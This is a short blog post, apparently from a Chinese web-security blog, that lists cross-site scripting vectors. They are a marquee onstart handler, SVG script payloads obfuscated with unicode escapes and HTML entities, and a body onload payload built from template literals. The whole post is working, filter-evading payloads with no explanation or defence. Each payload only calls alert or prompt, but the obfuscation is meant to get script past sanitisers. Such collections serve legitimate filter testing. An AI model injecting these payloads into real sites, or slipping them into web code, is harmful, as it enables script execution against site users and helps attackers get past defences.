---
title: collect xss vector
date: 2017-06-08 17:25:44
categories: Web安全
tags:
    - XSS
---


## tag

### marquee

```
<marquee onstart=alert(1)>xss</marquee>
```

### svg

```
# <svg><script>\u{61}lert`1`<script></svg>
<svg><script>&#x0005C;u&lcub;61&#125;le</>rt&grave;1&grave;</script></svg>
```

### body

```
<body onload=```${prompt``}`>
```
